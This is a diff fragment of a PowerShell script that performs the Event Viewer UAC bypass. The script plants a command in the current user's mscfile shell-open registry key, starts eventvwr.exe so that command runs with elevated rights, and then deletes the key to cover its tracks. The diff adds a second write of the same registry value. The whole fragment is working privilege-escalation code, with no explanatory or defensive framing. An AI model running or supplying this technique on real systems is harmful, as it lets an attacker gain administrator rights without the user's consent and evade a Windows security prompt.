@@ -5,6 +5,7 @@ New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\c
 $key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" 
 New-ItemProperty -Path $key -name '(Default)' -Value $comando -PropertyType string -Force | Out-Null
 Start-Process eventvwr.exe ; sleep -Seconds 3
+New-ItemProperty -Path $key -name '(Default)' -Value $comando -PropertyType string -Force | Out-Null
 Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile -Force | out-null
 }
 
